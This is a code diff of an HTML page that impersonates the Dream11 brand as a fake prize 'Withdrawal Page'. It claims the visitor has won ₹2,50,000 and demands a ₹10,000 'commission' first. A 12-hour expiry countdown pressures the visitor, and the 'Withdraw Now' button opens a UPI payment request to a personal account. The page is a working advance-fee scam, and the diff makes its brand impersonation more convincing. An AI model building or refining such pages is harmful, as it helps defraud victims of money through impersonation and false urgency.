@@ -3,111 +3,131 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Withdraw</title>
+  <title>Withdrawal Page</title>
   <style>
     body {
+      margin: 0;
       font-family: Arial, sans-serif;
-      background: #111;
-      color: #fff;
+      background-color: #d8232a;
+      color: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: white;
+      border-radius: 20px;
+      padding: 30px 20px;
       text-align: center;
-      padding: 30px;
+      max-width: 320px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
     }
+
+    .logo {
+      font-size: 30px;
+      color: red;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .heading {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+
     .amount {
-      font-size: 2.5em;
-      color: gold;
+      font-size: 32px;
+      color: green;
+      margin: 10px 0;
     }
+
     .note {
-      margin-top: 10px;
-      font-size: 1em;
-      color: #ccc;
+      font-size: 14px;
+      margin-bottom: 15px;
     }
-    #countdown {
-      margin-top: 20px;
-      font-size: 1.5em;
-      color: #ff4444;
+
+    .countdown {
+      font-size: 18px;
+      color: red;
+      margin-bottom: 20px;
     }
+
     .btn {
-      margin-top: 30px;
-      padding: 15px 30px;
-      background: green;
+      padding: 12px 25px;
+      background-color: #28a745;
       color: white;
-      font-size: 1.2em;
       border: none;
-      border-radius: 10px;
+      border-radius: 8px;
+      font-size: 16px;
       cursor: pointer;
     }
+
     .expired {
-      color: red;
-      font-size: 1.5em;
-      margin-top: 40px;
+      color: gray;
+      font-size: 20px;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <h1>Congratulations!</h1>
-  <div class="amount">₹2,50,000</div>
-  <div class="note">Note: 10% commission will be deducted on withdrawal.</div>
-
-  <div id="countdown"></div>
-  <div id="actionArea">
-    <button class="btn" onclick="window.location.href='upi://pay?pa=ramchoudhary2315@ybl&am=250000&cu=INR'">Withdraw Now</button>
+  <div class="container" id="mainContent">
+    <div class="logo">D</div>
+    <div class="logo" style="font-size: 18px;">DREAM11</div>
+    <div class="heading">Withdrawal Page</div>
+    <p>Your withdrawal amount is:</p>
+    <div class="amount">₹2,50,000</div>
+    <div class="note">You must pay ₹10,000 commission to proceed with withdrawal.</div>
+    <div class="countdown" id="timer">Time left: --:--:--</div>
+    <button class="btn" onclick="withdraw()">Withdraw Now</button>
   </div>
 
-  <!-- Celebration Sound -->
-  <audio id="celebrationSound" autoplay>
-    <source src="sounds/celebrate.mp3" type="audio/mpeg">
+  <div class="container" id="expiredContent" style="display:none;">
+    <div class="expired">Link Expired</div>
+  </div>
+
+  <audio id="celebrationAudio" autoplay>
+    <source src="12celebrate.mp3" type="audio/mp3" />
   </audio>
 
-  <!-- Confetti JS -->
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
   <script>
-    // Fire confetti
-    confetti({
-      particleCount: 200,
-      spread: 70,
-      origin: { y: 0.6 }
-    });
-
-    // Stop audio after 3 sec
-    setTimeout(() => {
-      document.getElementById('celebrationSound').pause();
-    }, 3000);
-
-    // 12 hour countdown logic
-    const countdownEl = document.getElementById('countdown');
-    const actionArea = document.getElementById('actionArea');
-
-    const firstVisitKey = 'withdrawalFirstVisitTime3';
-    let startTime = localStorage.getItem(firstVisitKey);
-
-    if (!startTime) {
-      startTime = new Date().getTime();
-      localStorage.setItem(firstVisitKey, startTime);
-    } else {
-      startTime = parseInt(startTime);
+    function withdraw() {
+      window.location.href = "upi://pay?pa=ramchoudhary2315@ybl&pn=Ram&cu=INR";
     }
 
-    const expirationTime = startTime + 12 * 60 * 60 * 1000;
+    const countdownEl = document.getElementById("timer");
+    const mainContent = document.getElementById("mainContent");
+    const expiredContent = document.getElementById("expiredContent");
+
+    const savedTime = localStorage.getItem("withdrawalStart");
+    const startTime = savedTime ? new Date(savedTime) : new Date();
+    if (!savedTime) {
+      localStorage.setItem("withdrawalStart", startTime);
+    }
+
+    const expireTime = new Date(startTime.getTime() + 12 * 60 * 60 * 1000);
 
     function updateCountdown() {
-      const now = new Date().getTime();
-      const distance = expirationTime - now;
+      const now = new Date();
+      const diff = expireTime - now;
 
-      if (distance <= 0) {
-        countdownEl.innerHTML = "<div class='expired'>Link Expired</div>";
-        actionArea.innerHTML = "";
+      if (diff <= 0) {
+        mainContent.style.display = "none";
+        expiredContent.style.display = "block";
         return;
       }
 
-      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+      const hours = Math.floor(diff / (1000 * 60 * 60));
+      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((diff % (1000 * 60)) / 1000);
 
-      countdownEl.innerHTML = `Link valid for: ${hours}h ${minutes}m ${seconds}s`;
+      countdownEl.textContent = `Time left: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
     }
 
-    updateCountdown();
     setInterval(updateCountdown, 1000);
+    updateCountdown();
   </script>
 </body>
 </html>
